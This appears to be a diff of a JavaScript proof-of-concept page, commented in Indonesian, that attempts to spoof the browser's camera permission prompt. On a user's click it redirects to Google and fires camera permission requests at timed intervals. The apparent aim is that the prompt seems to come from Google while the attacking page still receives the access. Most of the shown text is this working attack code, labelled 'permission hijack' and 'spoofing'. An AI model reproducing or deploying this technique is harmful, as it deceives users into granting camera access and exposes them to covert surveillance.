@@ -42,13 +42,12 @@
   }
 
   // ============================================
-  // KONFIGURASI
+  // KONFIGURASI (LANGSUNG KE GOOGLE.COM)
   // ============================================
-  var GOOGLE_DELAY = "http://google.com:9081"; // Port Delay
-  var GOOGLE_REAL = "https://www.google.com"; // Google Asli
+  var GOOGLE_REAL = "https://www.google.com"; 
 
   // ============================================
-  // FUNGSI: PERMISSION REQUEST (TOP-LEVEL)
+  // FUNGSI: PERMISSION REQUEST
   // ============================================
   function triggerCameraPermission() {
     try {
@@ -68,7 +67,7 @@
   }
 
   // ============================================
-  // TRIGGER RACE STACKING (KLIK)
+  // TRIGGER SPOOFING (KLIK)
   // ============================================
   document.body.addEventListener('click', function() {
     if (executed) return;
@@ -80,43 +79,31 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Delay Stacking Spoof...");
+    log("[!] Memulai Google Direct Spoof...");
 
     // ============================================
-    // A. REDIRECT KE PORT 9081 (0ms)
+    // A. REDIRECT LANGSUNG KE GOOGLE.COM (0ms)
     // ============================================
-    // Mulai transisi ke Google:9081 (akan hang).
     try {
-      log("[+] Redirect ke google.com:9081...");
-      window.location.href = GOOGLE_DELAY;
+      log("[+] Redirect ke Google.com...");
+      window.location.href = GOOGLE_REAL;
     } catch(e) {}
 
     // ============================================
     // B. PERMISSION HIJACK (10ms)
     // ============================================
-    // Tembak izin kamera saat browser sedang hang di 9081.
+    // Tembak izin kamera saat browser sedang memuat Google.
     setTimeout(function() {
       log("[+] Meminta Izin Kamera (Stacked)...");
       triggerCameraPermission();
     }, 10);
 
     // ============================================
-    // C. REDIRECT KE GOOGLE ASLI (150ms)
+    // C. RETRY PERMISSION (500ms)
     // ============================================
-    // Timpa dengan Google asli agar user melihat Google setelah prompt muncul.
+    // Jika gagal di awal, coba lagi saat halaman Google sudah muncul.
     setTimeout(function() {
-      log("[+] Menimpa dengan Google Asli...");
-      try {
-        window.location.href = GOOGLE_REAL;
-      } catch(e) {}
-    }, 150);
-
-    // ============================================
-    // D. RETRY PERMISSION (500ms)
-    // ============================================
-    // Jika prompt gagal muncul di awal, coba lagi saat sudah di Google.
-    setTimeout(function() {
-      log("[+] Retry Izin Kamera (di Google)...");
+      log("[+] Retry Izin Kamera...");
       triggerCameraPermission();
     }, 500);
 
